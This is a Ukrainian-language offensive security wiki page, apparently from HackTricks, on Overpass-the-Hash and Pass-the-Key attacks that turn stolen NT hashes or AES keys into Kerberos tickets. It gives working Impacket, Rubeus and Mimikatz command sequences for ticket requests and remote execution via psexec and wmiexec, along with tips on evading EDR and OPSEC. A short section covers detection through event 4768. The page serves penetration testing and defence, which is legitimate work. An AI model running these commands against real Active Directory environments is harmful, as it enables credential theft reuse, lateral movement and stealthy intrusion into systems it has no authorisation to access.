# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** атака призначена для середовищ, де традиційний протокол NTLM обмежений, а Kerberos authentication має пріоритет. Ця атака використовує NTLM hash або AES keys користувача, щоб запитувати Kerberos tickets, забезпечуючи несанкціонований доступ до ресурсів у мережі.

Строго кажучи:

- **Over-Pass-the-Hash** зазвичай означає перетворення **NT hash** на Kerberos TGT через **RC4-HMAC** Kerberos key.
- **Pass-the-Key** — це більш загальний варіант, коли у вас уже є Kerberos key, наприклад **AES128/AES256**, і ви запитуєте TGT безпосередньо з ним.

Ця різниця має значення в hardened середовищах: якщо **RC4 disabled** або більше не припускається KDC, **NT hash** сам по собі недостатній, і вам потрібен **AES key** (або cleartext password, щоб вивести його).

Щоб виконати цю атаку, початковий крок полягає в отриманні NTLM hash або password облікового запису цільового користувача. Після отримання цієї інформації можна отримати Ticket Granting Ticket (TGT) для облікового запису, що дає змогу атакувальнику отримати доступ до сервісів або машин, до яких користувач має permissions.

Процес можна ініціювати за допомогою таких команд:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Для сценаріїв, що потребують AES256, можна використовувати опцію `-aesKey [AES key]`:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` також підтримує запит **service ticket безпосередньо через AS-REQ** з `-service <SPN>`, що може бути корисним, коли вам потрібен ticket для конкретного SPN без додаткового TGS-REQ:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Більш того, отриманий ticket може бути використаний з різними tools, включно з `smbexec.py` або `wmiexec.py`, розширюючи scope атаки.

Проблеми на кшталт _PyAsn1Error_ або _KDC cannot find the name_ зазвичай вирішуються шляхом оновлення Impacket library або використання hostname замість IP address, що забезпечує compatibility з Kerberos KDC.

Альтернативна послідовність команд із використанням Rubeus.exe демонструє ще один аспект цієї technique:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Цей метод віддзеркалює підхід **Pass the Key**, з акцентом на захопленні та використанні ticket безпосередньо для цілей authentication. На практиці:

- `Rubeus asktgt` надсилає **raw Kerberos AS-REQ/AS-REP** самостійно і **не потребує** прав admin, якщо тільки ви не хочете націлити іншу logon session за допомогою `/luid` або створити окрему за допомогою `/createnetonly`.
- `mimikatz sekurlsa::pth` вбудовує credential material у logon session і тому **зачіпає LSASS**, що зазвичай потребує local admin або `SYSTEM` і є більш помітним з perspective EDR.

Приклади з Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Щоб відповідати operational security і використовувати AES256, можна застосувати таку команду:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` є релевантним, тому що трафік, згенерований Rubeus, трохи відрізняється від нативного Windows Kerberos. Також зауважте, що `/opsec` призначений для трафіку **AES256**; використання його з RC4 зазвичай вимагає `/force`, що значною мірою нівелює суть, оскільки **RC4 у сучасних доменах сам по собі є сильним сигналом**.

## Detection notes

Кожен TGT request генерує **event `4768`** на DC. У поточних збірках Windows цей event містить більше корисних полів, ніж згадують старі writeups:

- `TicketEncryptionType` показує, який enctype було використано для виданого TGT. Типові значення: `0x17` для **RC4-HMAC**, `0x11` для **AES128** і `0x12` для **AES256**.
- Оновлені events також показують `SessionKeyEncryptionType`, `PreAuthEncryptionType` і advertised enctypes клієнта, що допомагає відрізнити **реальну залежність від RC4** від заплутуючих legacy defaults.
- Побачити `0x17` у сучасному середовищі — це хороший натяк на те, що account, host або KDC fallback path усе ще дозволяє RC4 і, отже, є більш дружнім до NT-hash-based Over-Pass-the-Hash.

Microsoft поступово зменшує поведінку RC4-by-default з листопадовими 2022 Kerberos hardening updates, і поточна опублікована рекомендація — **прибрати RC4 як default assumed enctype для AD DCs до кінця Q2 2026**. З offensive perspective це означає, що **Pass-the-Key з AES** дедалі частіше є надійним шляхом, тоді як класичний **NT-hash-only OpTH** у hardened estates почне частіше fail.

Для детальніших відомостей про Kerberos encryption types і пов’язану ticketing behaviour, дивіться:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> Кожна logon session може мати лише один активний TGT одночасно, тому будьте обережні.

1. Створіть нову logon session за допомогою **`make_token`** з Cobalt Strike.
2. Потім використайте Rubeus, щоб згенерувати TGT для нової logon session, не впливаючи на вже існуючу.

Ви можете досягти схожої ізоляції безпосередньо в Rubeus за допомогою sacrificial **logon type 9** session:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Це запобігає перезапису поточного session TGT і зазвичай безпечніше, ніж імпортувати ticket у вашу наявну logon session.


## References

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
